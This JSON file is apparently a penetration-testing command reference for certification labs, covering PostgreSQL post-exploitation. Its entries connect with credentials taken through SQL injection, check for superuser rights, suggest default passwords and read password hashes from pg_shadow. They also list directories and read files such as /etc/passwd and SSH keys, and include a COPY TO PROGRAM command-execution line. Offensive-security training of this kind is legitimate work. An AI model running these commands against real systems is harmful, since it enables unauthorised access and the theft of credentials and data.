{
  "category": "exploitation",
  "subcategory": "database-postgresql",
  "description": "PostgreSQL post-exploitation commands for file access, enumeration, and privilege verification",
  "commands": [
    {
      "id": "postgres-direct-connect",
      "name": "PostgreSQL Direct Connection",
      "category": "exploitation",
      "subcategory": "database",
      "command": "psql -h <TARGET> -U <USERNAME> -d <DATABASE>",
      "description": "Establish direct connection to PostgreSQL database using psql client with extracted credentials",
      "tags": [
        "POSTGRESQL",
        "DATABASE",
        "CREDENTIAL_ACCESS",
        "LATERAL_MOVEMENT"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname running PostgreSQL",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Database username extracted from SQL injection or config files",
          "example": "postgres",
          "required": true
        },
        {
          "name": "<DATABASE>",
          "description": "Database name to connect to (discovered during enumeration)",
          "example": "webapp_db",
          "required": true
        }
      ],
      "flag_explanations": {
        "-h": "Host - target PostgreSQL server IP address or hostname (default: localhost)",
        "-U": "Username - database user account to authenticate as",
        "-d": "Database - specific database name to connect to (default: same as username)"
      },
      "success_indicators": [
        "psql (PostgreSQL version) prompt appears",
        "database=# or database=> prompt (# indicates superuser)",
        "SSL connection established message",
        "Can execute SELECT queries successfully"
      ],
      "failure_indicators": [
        "Connection refused (port 5432 filtered or closed)",
        "fe_sendauth: no password supplied",
        "FATAL: password authentication failed",
        "Connection timed out (firewall blocking)",
        "FATAL: database <DATABASE> does not exist"
      ],
      "next_steps": [
        "postgres-privilege-check",
        "postgres-file-enum",
        "postgres-file-read"
      ],
      "alternatives": [],
      "prerequisites": [
        "sqli-union-postgresql-info"
      ],
      "troubleshooting": {
        "connection_refused": "Verify port: sudo nmap -p 5432 -Pn -v <TARGET>. Check firewall rules. Ensure PostgreSQL listening on 0.0.0.0 (not just 127.0.0.1)",
        "authentication_failed": "Verify credentials with SQL injection first. Password may be hashed in config. Try common defaults: postgres:postgres, admin:admin",
        "ssl_required": "Add --set=sslmode=require if server enforces SSL. Or disable: --set=sslmode=disable",
        "database_not_exist": "List databases first: psql -h <TARGET> -U <USERNAME> -l (no -d flag). Then connect to discovered database",
        "password_prompt_automation": "Use PGPASSWORD environment variable: PGPASSWORD='<PASSWORD>' psql -h <TARGET> -U <USERNAME> -d <DATABASE> (avoids interactive prompt)"
      },
      "notes": "Password will be prompted interactively unless specified.\n\nFor automation/scripting:\nPGPASSWORD='<PASSWORD>' psql -h <TARGET> -U <USERNAME> -d <DATABASE>.\n\nAlternative non-interactive:\necho '<PASSWORD>' | psql -h <TARGET> -U <USERNAME> -d <DATABASE>.\n\nPort can be specified with -p <PORT> if not default 5432.\n\nAfter connection, use \\du to list users, \\l to list databases, \\dt to list tables.\n\ncertification TIP:\nIf SQLi extraction revealed credentials but web shell failed, direct database connection often bypasses network restrictions (PostgreSQL port 5432 may be selectively allowed).\n\nTime estimate:\n2-5 minutes for connection and verification.\n\nDocument connection success in breakthrough.md.",
      "filled_example": "psql -h 192.168.45.100 -U postgres -d webapp_db"
    },
    {
      "id": "postgres-privilege-check",
      "name": "PostgreSQL Superuser Privilege Check",
      "category": "exploitation",
      "subcategory": "database",
      "command": "SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;",
      "description": "Verify if connected database user has superuser privileges (required for pg_read_file and pg_ls_dir functions)",
      "tags": [
        "POSTGRESQL",
        "DATABASE",
        "PRIVILEGE_ESCALATION",
        "ENUMERATION"
      ],
      "variables": [],
      "flag_explanations": {
        "current_user": "Returns the username of the current database session",
        "usesuper": "Boolean column in pg_user indicating superuser status (t=true, f=false)",
        "pg_user": "System catalog table containing all database user accounts and their privileges"
      },
      "success_indicators": [
        "usesuper | t (TRUE - has superuser privileges)",
        "Prompt shows # instead of > (superuser indicator)",
        "Can execute administrative functions"
      ],
      "failure_indicators": [
        "usesuper | f (FALSE - not superuser)",
        "Prompt shows => (non-superuser indicator)",
        "Permission denied on administrative queries"
      ],
      "next_steps": [
        "postgres-file-enum",
        "postgres-file-read"
      ],
      "alternatives": [],
      "prerequisites": [
        "postgres-direct-connect"
      ],
      "troubleshooting": {
        "not_superuser": "Check other users: SELECT usename, usesuper FROM pg_user; Look for superuser accounts. Try extracting their passwords from pg_shadow (requires superuser). Alternative: exploit application-level vulnerabilities instead",
        "verify_specific_permissions": "Check file access: SELECT has_function_privilege('pg_read_file(text,bigint,bigint)', 'execute'); Returns TRUE if you can use pg_read_file",
        "check_available_functions": "List admin functions: \\df pg_* to see all PostgreSQL built-in functions you can use"
      },
      "notes": "Superuser (usesuper=t) privileges enable powerful capabilities:\n(1) Read arbitrary files with pg_read_file('/path/to/file'), (2) List directories with pg_ls_dir('/path/'), (3) Execute OS commands with COPY FROM PROGRAM (PostgreSQL 9.3+), (4) Read pg_shadow table (contains password hashes), (5) Modify postgresql.conf settings.\n\nNon-superuser (usesuper=f) is restricted to:\nSELECT on granted tables, cannot read files, cannot execute system commands.\n\ncertification TIP:\nMany PostgreSQL installations use 'postgres' superuser with weak/default password.\n\nIf current user is not superuser, enumerate other users with:\nSELECT usename,usesuper,valuntil FROM pg_user; Document privilege status immediately in investigation_checklist.md - determines entire exploitation path.\n\nTime estimate:\n1 minute."
    },
    {
      "id": "postgres-file-enum",
      "name": "PostgreSQL Directory Listing",
      "category": "exploitation",
      "subcategory": "database",
      "command": "SELECT pg_ls_dir('<DIRECTORY>');",
      "description": "List directory contents using PostgreSQL built-in pg_ls_dir() function (requires superuser)",
      "tags": [
        "POSTGRESQL",
        "DATABASE",
        "FILE_SYSTEM",
        "ENUMERATION",
        "DISCOVERY"
      ],
      "variables": [
        {
          "name": "<DIRECTORY>",
          "description": "Absolute path to directory to list",
          "example": "/var/www",
          "required": true
        }
      ],
      "flag_explanations": {
        "pg_ls_dir": "PostgreSQL built-in function to list directory contents (superuser only)",
        "<DIRECTORY>": "Must be absolute path (starts with /), not relative paths"
      },
      "success_indicators": [
        "File and directory names listed as rows",
        "Multiple entries returned",
        "Can see flag.txt, credentials, config files"
      ],
      "failure_indicators": [
        "ERROR: permission denied (postgres user lacks OS-level permissions)",
        "ERROR: could not open directory (directory doesn't exist)",
        "ERROR: function pg_ls_dir(text) does not exist (not superuser)",
        "0 rows returned (empty directory or no access)"
      ],
      "next_steps": [
        "postgres-file-read"
      ],
      "alternatives": [],
      "prerequisites": [
        "postgres-direct-connect",
        "postgres-privilege-check"
      ],
      "troubleshooting": {
        "permission_denied": "Try directories readable by postgres user: /tmp, /var/log/postgresql, /var/lib/postgresql, /var/www (if web server group). Cannot read: /root, /home/*, /etc/shadow",
        "function_not_exist": "Verify superuser: SELECT usesuper FROM pg_user WHERE usename=current_user; Must return 't'. Non-superuser cannot use pg_ls_dir",
        "directory_not_exist": "Check parent directory first: pg_ls_dir('/var') then pg_ls_dir('/var/www'). Build path incrementally",
        "systematic_enumeration": "Start at root: pg_ls_dir('/') then check: /home, /tmp, /var, /opt, /usr/local/bin. Look for: flag.txt, credentials, .ssh, backups"
      },
      "notes": "Common directories to enumerate (priority order for certification):\n(1) /var/www - web server files (often accessible), (2) /tmp - world-writable (always readable), (3) /home - user directories (rarely accessible), (4) /opt - custom applications, (5) /root - root home (usually denied), (6) / - filesystem root (overview).\n\nPostgres user (uid=106 typically) permissions:\nCAN read world-readable files and directories postgres owns or is in group, CANNOT read protected directories like /root, /etc/shadow, user home directories.\n\nAdvanced:\nCombine with string_agg() for compact output:\nSELECT string_agg(pg_ls_dir('/var/www'), ', '); certification WORKFLOW:\nStart at /, identify promising directories, drill down systematically.\n\nDocument directory structure in investigation_checklist.md.\n\nTime estimate:\n5-10 minutes for thorough enumeration.",
      "filled_example": "SELECT pg_ls_dir('/var/www');"
    },
    {
      "id": "postgres-file-read",
      "name": "PostgreSQL File Read",
      "category": "exploitation",
      "subcategory": "database",
      "command": "SELECT pg_read_file('<FILE_PATH>');",
      "description": "Read file contents using PostgreSQL built-in pg_read_file() function (requires superuser and file read permissions)",
      "tags": [
        "POSTGRESQL",
        "DATABASE",
        "FILE_SYSTEM",
        "CREDENTIAL_ACCESS",
        "DATA_EXFILTRATION"
      ],
      "variables": [
        {
          "name": "<FILE_PATH>",
          "description": "Absolute path to file to read",
          "example": "/var/www/flag.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "pg_read_file": "PostgreSQL superuser function to read file contents and return as text",
        "<FILE_PATH>": "Must be absolute path, file must be readable by postgres OS user",
        "offset (optional)": "Byte offset to start reading from (default: 0)",
        "length (optional)": "Number of bytes to read (default: entire file)"
      },
      "success_indicators": [
        "File contents displayed in query result",
        "Text visible and readable",
        "Flag format visible (OS{...}, local.txt, proof.txt)",
        "Credentials or SSH keys extracted"
      ],
      "failure_indicators": [
        "ERROR: permission denied (postgres user cannot read file)",
        "ERROR: could not open file (file doesn't exist)",
        "ERROR: function pg_read_file does not exist (not superuser)",
        "Binary file content (unreadable characters)"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [
        "postgres-direct-connect",
        "postgres-privilege-check",
        "postgres-file-enum"
      ],
      "troubleshooting": {
        "permission_denied": "Verify file permissions: pg_stat_file('/var/www/flag.txt') shows owner/permissions. Postgres user needs read permission. Try world-readable files first",
        "file_too_large": "Read in chunks: pg_read_file('/large/file', 0, 1000) reads first 1000 bytes. Then pg_read_file('/large/file', 1000, 1000) for next chunk",
        "binary_file": "Cannot read binary files as text. Alternative: pg_read_binary_file() or COPY to export: COPY (SELECT pg_read_binary_file('/path')) TO '/tmp/output'",
        "encoding_issues": "Set client encoding: SET client_encoding = 'UTF8'; Then retry read. Or encode: SELECT encode(pg_read_binary_file('/file'), 'base64');"
      },
      "notes": "Full syntax:\npg_read_file(filename [, offset, length [, missing_ok]]).\n\nExamples:\n(1) Read entire file:\nSELECT pg_read_file('/etc/passwd'); (2) Read first 100 bytes:\nSELECT pg_read_file('/var/log/app.log', 0, 100); (3) Read middle chunk:\nSELECT pg_read_file('/file', 500, 200); (4) Ignore missing:\nSELECT pg_read_file('/maybe/not/here', 0, 1000, true); File access permissions:\nPostgres user (uid=106) can read:\nworld-readable files (chmod 644), files in /var/www (if postgres in www-data group), /tmp files.\n\nCANNOT read:\n/root/*, /home/user/.ssh/*, /etc/shadow.\n\nCommon certification targets:\n/var/www/flag.txt, /var/www/html/config.php, /home/user/local.txt, /root/proof.txt (rarely accessible), ~/.ssh/id_rsa (if accessible).\n\nAlternative for command execution:\nCOPY (SELECT '') TO PROGRAM 'cat /etc/passwd' but often hangs due to process restrictions.\n\nTime estimate:\n2-5 minutes once file located.\n\nCAPTURE FLAG IMMEDIATELY - take screenshot, save output to breakthrough.md.",
      "filled_example": "SELECT pg_read_file('/var/www/flag.txt');"
    }
  ]
}